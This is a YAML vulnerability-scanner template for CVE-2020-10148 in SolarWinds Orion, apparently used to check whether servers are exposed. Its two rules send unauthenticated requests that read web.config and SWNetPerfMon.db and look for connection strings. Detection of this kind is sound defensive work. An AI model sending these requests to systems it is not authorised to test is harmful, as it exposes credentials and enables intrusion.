name: yaml-poc-solarwinds-orion_platform-unauthorized_access-CVE-2020-10148
binding: 439c81f0-9b7a-4baf-a3ed-c648106e06e9
detail:
    author: system_user
    links:
        - https://kb.cert.org/vuls/id/843464
        - https://www.kb.cert.org/vuls/id/843464
        - https://www.solarwinds.com/securityadvisory
    vulnerability:
        id: fae1f7c5-8b7b-438f-a807-2b4889dcbbe5
        level: critical
transport: http
set:
    rstr: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /web.config.i18n.ashx?l={{rstr}}&v={{rstr}}
            follow_redirects: false
        expression: (response.body.bcontains(b"SolarWinds.Orion.Core.") || response.body.bcontains(b"Connection String")) && response.raw_header.bcontains(b"text/plain") && response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /SWNetPerfMon.db.i18n.ashx?l={{rstr}}&v={{rstr}}
            follow_redirects: false
        expression: (response.body.bcontains(b"SolarWinds.Orion.Core.") || response.body.bcontains(b"Connection String")) && response.raw_header.bcontains(b"text/plain") && response.status == 200
expression: r0() || r1()
